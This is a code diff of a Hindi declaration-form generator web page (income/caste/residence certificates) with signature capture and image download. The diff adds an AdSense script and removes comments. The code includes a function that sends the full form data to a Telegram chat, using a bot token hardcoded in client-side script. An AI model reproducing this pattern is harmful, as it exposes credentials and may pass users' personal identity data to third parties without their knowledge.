@@ -4,6 +4,11 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Rimsha Graphics - Digital Form Portal</title>
+  
+  <!-- गूगल एडसेंस कोड (Google AdSense Code Integrated Here) -->
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2674528008442854"
+       crossorigin="anonymous"></script>
+
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
   <style>
@@ -58,7 +63,6 @@
       box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.15);
     }
 
-    /* गूगल इनपुट टूल्स स्टाइल लाइव सजेशन मेनू */
     .suggestion-box {
       position: absolute;
       z-index: 1000;
@@ -239,7 +243,6 @@
           <p class="text-xs text-blue-600 font-semibold mt-0.5">English में लिखें, नीचे आ रहे सही विकल्प को चुनें या Space दबाएँ</p>
         </div>
         <div class="flex items-center gap-4">
-          <!-- पॉपअप के अंदर ब्रांडिंग जोड़ी गई -->
           <span class="text-sm font-black bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent tracking-tight hidden sm:inline-block">Designed by Rimsha Graphics</span>
           <button onclick="closeFormModal()" class="text-slate-400 hover:text-slate-600 bg-white p-2 border rounded-xl shadow-sm transition-transform hover:scale-105">
             <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
@@ -292,7 +295,6 @@
       </div>
 
       <div class="p-6 bg-slate-100 overflow-x-auto flex justify-center">
-        <!-- प्रिंटिंग एरिया (स्ट्रिक्ट चौड़ाई मोबाइल रिस्पॉन्सिव फोर्स को ब्लॉक करने के लिए) -->
         <div id="printArea" style="width: 700px; min-width: 700px; max-width: 700px;" class="p-8 bg-white shadow-sm select-none mx-auto">
           <h2 class="text-center text-2xl font-bold mb-1 text-slate-800 tracking-wide">स्वप्रमाणित घोषणा - पत्र</h2>
           <h3 class="text-center text-sm mb-8 font-semibold text-slate-500">आय/जाति/निवास प्रमाण - पत्र हेतु</h3>
@@ -328,7 +330,6 @@
         </div>
       </div>
 
-      <!-- रीसेट और डाउनलोड एक्शन्स बार -->
       <div class="p-4 bg-slate-50 border-t border-slate-200 flex justify-between items-center rounded-b-24 flex-wrap gap-2">
         <button onclick="systemGlobalReset()" class="bg-red-500 text-white px-5 py-2.5 rounded-xl text-sm font-semibold hover:bg-red-600 transition-colors shadow-sm">
           Reset & New Entry
@@ -342,7 +343,6 @@
   </div>
 
   <script>
-    // --- 1. हिंग्लिश टू हिंदी इनपुट इंजन सजेशन मेनू के साथ ---
     let currentActiveSuggestionIndex = -1;
     let currentActiveSuggestions = [];
 
@@ -436,7 +436,6 @@
       }
     });
 
-    // --- 2. सिग्नेचर कैनवास सिस्टम ---
     const cvs = document.getElementById('signatureCanvas');
     const gl = cvs.getContext('2d');
     let isDrawing = false;
@@ -488,12 +487,10 @@
 
     function clearCanvas() { gl.clearRect(0, 0, cvs.width, cvs.height); }
 
-    // --- 3. मॉडल्स कंट्रोल ---
     function openFormModal() { document.getElementById('formModal').style.display = 'flex'; }
     function closeFormModal() { document.getElementById('formModal').style.display = 'none'; }
     function closeResultModal() { document.getElementById('resultModal').style.display = 'none'; }
 
-    // --- 4. फॉर्म सबमिशन और रेंडरिंग ---
     async function submitDataAndGenerate() {
       const fields = [
         { id: "name", title: "नाम" }, { id: "father", title: "पिता/पति का नाम" },
@@ -553,11 +550,9 @@
       document.getElementById('resultModal').style.display = 'flex';
     }
 
-    // --- 5. मोबाइल स्क्रीन पर डेस्कटॉप साइज फोर्स रेंडर इमेज डाउनलोडर ---
     async function downloadCompressedJPEG() {
       const area = document.getElementById('printArea');
       
-      // html2canvas को विंडो की विड्थ 750px मानने पर मजबूर करना ताकि मोबाइल पर लेआउट न बिगड़े
       const renderedCanvas = await html2canvas(area, {
         scale: 2,
         useCORS: true,
@@ -599,7 +594,6 @@
       }
     }
 
-    // --- 6. टेलीग्राम फुल डेटा सेंडर ---
     async function sendToTelegram() {
       const token = "8313201713:AAF5N2rfAtW8KtPwLKitXnrfXuuEFB68CB4";
       const chat = "1913335716";
@@ -631,7 +625,6 @@
       }
     }
 
-    // --- 7. ग्लोबल सिस्टम रीसेट फंक्शन ---
     function systemGlobalReset() {
       document.querySelectorAll('input').forEach(i => {
         if(i.type !== 'file') i.value = '';
